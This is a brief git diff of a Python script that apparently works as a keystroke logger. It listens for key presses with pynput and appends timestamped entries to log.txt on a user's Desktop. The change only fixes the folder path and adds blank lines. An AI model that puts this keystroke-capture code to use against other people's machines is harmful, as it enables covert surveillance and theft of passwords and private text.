@@ -8,7 +8,7 @@ import atexit
 
 
 keys = []
-folder = "C:/Users/Mateusz Ziętara/Desktop"
+folder = "C:/Users/Mateusz Ziętara/Desktop/"
 
 with open(folder + "log.txt", "a") as f:
     t = '\n\n********************************************* Run on: ' + str(datetime.datetime.now()) + '   <---Tak!\n\n'
@@ -33,4 +33,6 @@ def zapis(keys):
 
 with Listener(on_press=naciskasz) as listener:
     listener.join()
+
+
 
